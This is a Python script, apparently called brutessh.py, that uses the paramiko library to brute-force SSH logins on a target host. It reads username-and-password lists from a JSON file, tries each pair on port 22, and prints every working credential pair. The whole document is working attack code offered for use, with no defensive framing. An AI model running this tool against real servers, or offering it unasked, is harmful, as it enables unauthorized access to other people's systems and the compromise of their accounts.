#!/usr/bin/env python3
'''
Example execution:
$ python brutessh.py -domain <target ip address>
'''
import configparser
import argparse
import json
import sys, paramiko

params = configparser.ConfigParser()
params.read('params.ini')

def sshconnect(username, password, ssh_domain):
    ssh = paramiko.SSHClient()
    assert username != " " , 'Username cannot be empty'
    # empty password is acceptable but not an empty username
    try:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ssh_domain, 22, username, password)
    except Exception as e:
        print(e)
        ssh = None

    return ssh

def bruteforce(users_dict, domain):
    user_pass_list = [];
    for user in users_dict:
        for password in users_dict[user]:
            attempt = sshconnect(user, password, domain)
            if attempt:
                print(("Found suitable user : pass -->" + user + " : " + password))
                info = {
                    "Username": user,
                    "Password": password,
                }
                user_pass_list.append(info)
                '''
                All the suitable pairs of username and passwords are appended to a list
                and finally the list is printed instead of returning a connection.
                '''
    print (user_pass_list)
    return None

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument('-domain')

    args = parser.parse_args()

    domain = args.domain

    if not domain:
        print('You must define an SSH domain')
        domain = input('Domain: ')

    if params['SSH']['users_pass'] == '':
        print('You must define user/pass JSON file')
        filename = input('Filename: ')

    else:
        filename = params['SSH']['users_pass']

    users_dict = json.load(open(filename, 'r'))

    return bruteforce(users_dict, domain)

if __name__== "__main__":
    main()
